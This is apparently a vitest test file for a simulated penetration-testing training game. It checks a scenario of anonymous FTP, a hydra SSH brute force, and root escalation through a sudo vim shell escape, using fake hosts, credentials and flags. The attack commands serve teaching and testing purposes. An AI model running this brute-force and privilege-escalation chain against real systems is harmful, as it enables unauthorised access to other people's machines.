// ── commands/__tests__/happyPath-scenario05.test.ts ───────────────
// Happy path tests for Scenario 05: FTP Enumeration + Brute Force + Privilege Escalation

import { describe, it, expect } from 'vitest';
import { createAttacker, exec, evolveState, expectSuccess, withLevel, setupBeforeEach } from './happyPathHelpers';
import { shellManager } from '../../shells';
import type { Machine } from '../../types';

setupBeforeEach();

describe('Happy Path: Scenario 05 - FTP Enumeration & Privilege Escalation', () => {
  const attacker = createAttacker();
  const ftpTarget: Machine = {
    id: 'lab-scenario-05-target',
    machine_info: {
      hostname: 'ftp-target',
      ip: '192.168.30.11',
      mac: '08:00:27:E8:F9:0A',
      os: 'Ubuntu 20.04 LTS',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version: 'vsFTPd 3.0.3' },
        { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu', credentials: { user: 'john', pass: 'ilovelinux' } },
      ],
    },
    web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [
      { id: 1, task: 'Descubrimiento de host', text: 'Descubrí el host activo: arp-scan <network/cidr>', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Identificá los servicios: nmap -sV <target-ip>', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 2 },
      { id: 3, task: 'Acceso FTP anónimo', text: 'Conectate al FTP: ftp <target-ip>', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 2 },
      { id: 4, task: 'Descargar nota', text: 'Descargá la nota: get nota_seguridad.txt', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 2 },
      { id: 5, task: 'Leer nota', text: 'Leé la nota: cat nota_seguridad.txt', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 2 },
      { id: 6, task: 'Fuerza bruta SSH', text: 'Obtené credenciales: hydra -l john -P /usr/share/wordlist/rockyou.txt <target-ip> ssh', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 3 },
      { id: 7, task: 'Acceso SSH', text: 'Conectate: ssh john@<target-ip> <password>', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 3 },
      { id: 8, task: 'Enumeración de sudo', text: 'Listá permisos: sudo -l', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 3 },
      { id: 9, task: 'Escalada de privilegios', text: "Usá vim: sudo vim -c '!bash'", targetMachineId: 'lab-scenario-05-target', discoveryLevel: 4 },
      { id: 10, task: 'Capturar flag root', text: 'Leé la flag: cat /root/flag2.txt', targetMachineId: 'lab-scenario-05-target', discoveryLevel: 4 },
    ],
    files: [
      { path: '/srv/ftp/nota_seguridad.txt', content: 'Para: john\nDe: Equipo de Seguridad\nURGENTE: John, el sistema reportó que tu contraseña de SSH es débil.', type: 'text' },
      { path: '/etc/sudoers', content: 'john ALL=(ALL) NOPASSWD: /usr/bin/vim', type: 'text' },
      { path: '/root/flag2.txt', content: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', type: 'text' },
      { path: '/home/john/user.txt', content: 'ZIL{FTP_ANON_ACCESS}', type: 'text' },
    ],
  };

  it('Paso 1: arp-scan descubre el host', () => {
    const result = exec('arp-scan 192.168.30.0/24', attacker, [attacker, ftpTarget], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    expect(result.output).toContain('192.168.30.11');
  });

  it('Paso 2: nmap detecta FTP y SSH', () => {
    const target = withLevel(ftpTarget, 1);
    const result = exec('nmap -sV 192.168.30.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    expect(result.output).toContain('21/tcp');
    expect(result.output).toContain('22/tcp');
  });

  it('Paso 3: ftp — valida acceso anónimo', () => {
    const target = withLevel(ftpTarget, 2);
    const result = exec('ftp 192.168.30.11', attacker, [attacker, target], 3);
    expectSuccess(result);
    expect(result.output).toContain('Connected to');
    expect(result.ftpSession?.connected).toBe(true);
  });

  it('Paso 4: hydra — valida credenciales john/ilovelinux', () => {
    const attackerWithDict: Machine = {
      ...attacker,
      files: [
        { path: '/usr/share/wordlists/rockyou.txt', content: 'password\n123456\nilovelinux\n', type: 'text' }
      ]
    };
    const target = withLevel(ftpTarget, 2);
    const result = exec('hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.30.11 ssh', attackerWithDict, [attackerWithDict, target], 6);
    expectSuccess(result);
    expect(result.foundCredentials).toBeDefined();
    expect(result.foundCredentials?.user).toBe('john');
    expect(result.foundCredentials?.pass).toBe('ilovelinux');
    expect(result.completedMissionId).toBe(6);
  });

  it('Paso 5: ssh — inicia sesión interactiva y pide contraseña', () => {
    const target = withLevel(ftpTarget, 3);
    const result = exec('ssh john@192.168.30.11', attacker, [attacker, target], 7);
    expectSuccess(result);
    expect(result.output).toContain('password');
    expect(result.sshSession?.active).toBe(true);
  });

  it('Paso 5b: ssh — autentica con contraseña correcta', () => {
    const target = withLevel(ftpTarget, 3);
    // First start the session
    exec('ssh john@192.168.30.11', attacker, [attacker, target], 7);
    // Then provide password
    const result = exec('ilovelinux', attacker, [attacker, target], 7);
    expectSuccess(result);
    expect(result.newMachineId).toBe('lab-scenario-05-target');
    expect(result.completedMissionId).toBe(7);
  });

  it('Paso 6: sudo -l, muestra permisos de vim (NOPASSWD)', () => {
    const target = withLevel(ftpTarget, 3);
    const result = exec('sudo -l', target, [attacker, target], 8);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(8);
    expect(result.output).toContain('NOPASSWD');
    expect(result.output).toContain('vim');
  });

  it('Paso 7: sudo vim -c !bash escala a root (uid=0)', () => {
    const target = withLevel(ftpTarget, 3);
    const result = exec("sudo vim -c '!bash'", target, [attacker, target], 9);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(9);
    expect(result.output).toContain('uid=0');
  });

  it('Paso 8: cat /root/flag2.txt — flag de root', () => {
    const target = withLevel(ftpTarget, 4);
    const result = exec('cat /root/flag2.txt', target, [attacker, target], 10);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(10);
    expect(result.output).toBe('ZIL{SUDO_VIM_PRIVESC_COMPLETE}');
  });

  it('ssh sin hydra previo debe fallar', () => {
    const target = withLevel(ftpTarget, 2);
    const result = exec('ssh john@192.168.30.11 ilovelinux', attacker, [attacker, target], 6);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
    expect(result.newMachineId).toBeUndefined();
  });

  it('Golden path: arp-scan → nmap → ftp → hydra → ssh → sudo -l → privesc → flag', () => {
    let machines: Machine[] = [attacker, ftpTarget];

    let result = exec('arp-scan 192.168.30.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    result = exec('nmap -sV 192.168.30.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    result = exec('ftp 192.168.30.11', attacker, machines, 3);
    expect(result.completedMissionId).toBeUndefined();
    expect(result.ftpSession?.connected).toBe(true);
    machines = evolveState(machines, result);

    shellManager.reset();

    machines = machines.map(m => m.id === 'attacker-01' ? { ...m, files: [{ path: '/usr/share/wordlists/rockyou.txt', content: 'password\n123456\nilovelinux\n', type: 'text' }] } : m);
    const attackerWithDict = machines.find(m => m.id === 'attacker-01')!;
    result = exec('hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.30.11 ssh', attackerWithDict, machines, 6);
    expect(result.completedMissionId).toBe(6);
    expect(result.foundCredentials?.user).toBe('john');
    expect(result.foundCredentials?.pass).toBe('ilovelinux');
    machines = evolveState(machines, result);

    result = exec('ssh john@192.168.30.11', attackerWithDict, machines, 7);
    expect(result.sshSession?.active).toBe(true);
    // Provide password
    result = exec('ilovelinux', attackerWithDict, machines, 7);
    expect(result.completedMissionId).toBe(7);
    expect(result.newMachineId).toBe('lab-scenario-05-target');
    machines = evolveState(machines, result);

    const sessionTarget = machines.find(m => m.id === 'lab-scenario-05-target')!;

    result = exec('sudo -l', sessionTarget, machines, 8);
    expect(result.output).toContain('NOPASSWD');
    machines = evolveState(machines, result);

    result = exec("sudo vim -c '!bash'", sessionTarget, machines, 9);
    expect(result.completedMissionId).toBe(9);
    expect(result.output).toContain('uid=0');
    machines = evolveState(machines, result);

    const rootTarget = machines.find(m => m.id === 'lab-scenario-05-target')!;
    result = exec('cat /root/flag2.txt', rootTarget, machines, 10);
    expect(result.completedMissionId).toBe(10);
    expect(result.output).toBe('ZIL{SUDO_VIM_PRIVESC_COMPLETE}');
  });
});
